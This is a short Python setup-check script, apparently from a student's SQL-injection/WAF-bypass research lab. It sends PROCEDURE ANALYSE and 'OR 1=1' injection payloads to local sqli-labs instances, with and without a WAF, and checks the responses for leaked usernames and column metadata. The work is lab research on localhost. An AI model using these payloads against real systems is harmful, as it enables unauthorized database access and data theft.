"""
bypass_lab/check_setup.py
==========================
Cek apakah Less-2 ada dan PROCEDURE ANALYSE jalan.

Run:
    python3 -m bypass_lab.check_setup
"""
import sys
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
import requests

PLAIN = "http://localhost:8081"
WAF   = "http://localhost:8888"

# Cek Less-1 sampai Less-5
print("=== Cek Less yang tersedia ===")
for i in range(1, 6):
    path = f"/Less-{i}/"
    r = requests.get(f"{PLAIN}{path}", params={"id": "1"}, timeout=5)
    has_data = "Dumb" in r.text or "Your" in r.text
    print(f"  Less-{i}: HTTP {r.status_code} | data={has_data}")

# PROCEDURE ANALYSE di Less-1 dan Less-2
print("\n=== PROCEDURE ANALYSE test ===")
for less, payload in [
    ("Less-1", "1' PROCEDURE ANALYSE(1,1)-- -"),
    ("Less-1 numeric trick", "1 PROCEDURE ANALYSE(1,1)-- -"),
    ("Less-2", "1 PROCEDURE ANALYSE(1,1)-- -"),
    ("Less-2 all", "0 OR 1=1 PROCEDURE ANALYSE(1,1)-- -"),
]:
    path = "/Less-2/" if "Less-2" in less else "/Less-1/"
    for host, tag in [(PLAIN, "PLAIN"), (WAF, "WAF")]:
        r = requests.get(f"{host}{path}", params={"id": payload}, timeout=5)
        has_proc = "Optimal_fieldtype" in r.text or "varchar" in r.text.lower()
        has_user = any(x in r.text for x in ["Dumb", "Angelina", "admin"])
        print(f"  [{tag}] {less}: HTTP {r.status_code} | proc={has_proc} | user={has_user}")
        if has_proc:
            idx = r.text.lower().find("optimal")
            print(f"    snippet: {r.text[max(0,idx-20):idx+100]}")
